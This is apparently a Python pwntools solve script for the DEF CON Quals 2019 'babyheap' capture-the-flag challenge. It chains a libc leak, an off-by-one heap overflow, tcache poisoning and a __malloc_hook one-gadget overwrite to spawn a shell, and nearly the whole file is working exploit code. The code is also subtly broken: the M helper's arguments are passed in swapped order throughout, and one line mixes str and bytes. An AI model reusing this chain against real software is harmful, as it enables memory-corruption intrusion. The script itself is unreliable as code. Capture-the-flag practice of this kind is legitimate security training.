#!/usr/bin/env python3
"""DEF CON Quals 2019 - babyheap solve script
Vulnerability: Single byte overflow (off-by-one)
Technique: Single byte overflow -> larger overflow -> tcache poisoning -> malloc_hook overwrite
"""
from pwn import *

context.arch = 'amd64'
exe = context.binary = ELF("./binary", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

def start():
    return process([exe.path], env={"LD_PRELOAD": libc.path})

def M(sz, buf):
    io.sendlineafter("> ", "M")
    io.sendlineafter("> ", str(sz))
    io.sendlineafter("> ", buf)

def F(i):
    io.sendlineafter("> ", "F")
    io.sendlineafter("> ", str(i))

def S(i):
    io.sendlineafter("> ", "S")
    io.sendlineafter("> ", str(i))
    return io.recvline()

io = start()

# Fill up tcache and get chunks in unsorted bin
for i in range(10):
    M(str(i)*0xf8, 0xf8)

for i in range(9, -1, -1):
    F(i)

# Allocate until we get to unsorted bin chunk
for _ in range(7):
    M('', 0xf8)

M('15935728', 0xf8)  # Libc address here

# Leak libc
F(8)
S(8)
io.recvuntil("15935728")
leak = io.recvline().replace(b"\x0a", b"")
leak = u64(leak + b"\x00"*(8 - len(leak)))
libc_base = leak - 0x1e4ca0
log.info(f"libc base: {hex(libc_base)}")

# Off-by-one overflow
M('3'*8, 0x8)  # Chunk whose size will be overflowed
M('4'*0xf8 + b"\x81", 0xf8)  # Overflow chunk

F(0)  # Free overflowed chunk

# Larger overflow to overwrite tcache pointer
M('1'*0x100 + p64(libc_base + libc.sym["__malloc_hook"])[:6], 0x174)

# Allocate to get malloc hook
M("15935728", 0x10)

# Write one gadget
onegadget = libc_base + 0xe2383
M(p64(onegadget)[:6], 0x10)

# Trigger malloc
io.sendline('M')
io.sendline("10")
io.interactive()
